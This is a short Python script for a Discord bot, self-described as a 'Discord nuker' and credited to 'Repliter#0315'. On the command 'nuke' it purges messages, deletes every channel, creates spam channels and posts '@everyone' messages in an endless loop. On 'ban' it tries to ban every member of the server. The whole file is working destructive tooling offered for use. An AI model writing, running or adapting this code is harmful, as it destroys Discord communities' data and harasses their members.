# Made by Repliter#0315


import discord
from time import sleep
from discord.ext import commands

class MyClient(discord.Client):
    async def on_ready(self):
        print("Discord nuker")
        print('Logged on as', self.user)
        print("")
        print("Commands:")
        print("nuke")
        print("ban")
        print("Logs:")

    async def on_message(self, message):
        if message.author == self.user:
            return

        if message.content == 'nuke':
            guildyes = message.guild
            print("ran nuke")
            await message.channel.send('Server nuke initializing. @everyone')
            sleep(5)
            await message.channel.purge(limit=100000)

            for channel in message.guild.channels:
                await channel.delete()

            for i in range(1, 20):
                await guildyes.create_text_channel("LMAO NUKED")
            while True:
                for channel in message.guild.channels:
                    await channel.send('THIS SERVER IS GETTING NUKED, CRY ABOUT IT @everyone')


        if message.content == 'ban':
            print("ran ban")
            for member in message.guild.members:
                if member == self.user:
                    print("Tried to ban myself, that's stupid lol")
                else:
                    try:
                        await member.ban(reason="cringe")
                        print(f"Banned user {member}")
                    except:
                        print(f"Failed to ban user {member}")

intents = discord.Intents.all()
client = MyClient(intents=intents)
token = input(str("Token> "))
print("Logging on bot, please wait.")
client.run(token)
